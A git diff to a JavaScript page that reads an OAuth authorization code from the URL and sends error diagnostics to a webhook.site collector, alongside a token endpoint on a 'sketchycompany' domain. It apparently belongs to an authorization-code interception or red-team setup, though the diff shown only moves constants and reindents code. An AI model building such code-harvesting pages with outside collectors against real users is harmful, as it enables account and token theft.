@@ -7,11 +7,10 @@
         });
 
         async function sendCode() {
+            const TOKEN_URL = "https://login.sketchycompany.upd-dcs.work/token";
+            const WEBHOOK =
+                "https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e";
             try {
-                const TOKEN_URL =
-                    "https://login.sketchycompany.upd-dcs.work/token";
-                const WEBHOOK =
-                    "https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e";
                 const searchParams = window.location.search;
                 const parsedParams = new URLSearchParams(searchParams);
                 const code = parsedParams.get("code");
@@ -76,21 +75,21 @@
                 }
 
                 await fetch(WEBHOOK, {
-                        method: "POST",
-                        headers: { "Content-Type": "text/plain" },
-                        body: JSON.stringify({
-                            event: "Token fetch threw",
-                            name: error.name,
-                            message: error.message,
-                            stack: error.stack,
-                            isTypeError: error instanceof TypeError,
-                            endpointReachable,
-                            verdict: endpointReachable
-                                ? "reachable -> CORS/header block (check DevTools console)"
-                                : "unreachable -> DNS/TLS/network failure",
-                            origin: location.origin,
-                        }),
-                    });
+                    method: "POST",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify({
+                        event: "Token fetch threw",
+                        name: error.name,
+                        message: error.message,
+                        stack: error.stack,
+                        isTypeError: error instanceof TypeError,
+                        endpointReachable,
+                        verdict: endpointReachable
+                            ? "reachable -> CORS/header block (check DevTools console)"
+                            : "unreachable -> DNS/TLS/network failure",
+                        origin: location.origin,
+                    }),
+                });
             }
         }
 
